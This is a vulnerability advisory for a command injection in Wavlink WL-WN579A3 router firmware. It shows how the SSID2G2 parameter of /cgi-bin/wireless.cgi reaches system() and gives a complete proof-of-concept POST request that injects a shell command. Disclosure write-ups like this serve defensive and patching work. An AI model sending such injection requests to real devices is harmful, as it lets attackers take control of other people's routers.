# Wavlink WN579A3 multi_ssid
### Overview
vendor: Wavlink

product: WL-WN579A3

version: 20210219

type: Command Injection
### Vulnerability Description
A vulnerability has been found in Wavlink WL-WN579A3 20210219. This vulnerability can be triggered through the route /cgi-bin/wireless.cgi. The manipulation of the argument SSID2G2 leads to command injection. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.
### Vulnerability Details
In the sub_4022B4 function, the value of the SSID2G2 parameter is obtained via a post request. Then, the value of the SSID2G2 parameter is passed to the v28 variable via the sprintf function, which in turn is passed to the system function.

![](./images/1.png)

![](./images/2.png)

### POC
```
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 54
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.1/html/networkSetting.shtml
Accept-Encoding: gzip, deflate, br
Cookie: session=1158158187
Connection: keep-alive

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=$(ls>/1.txt)
```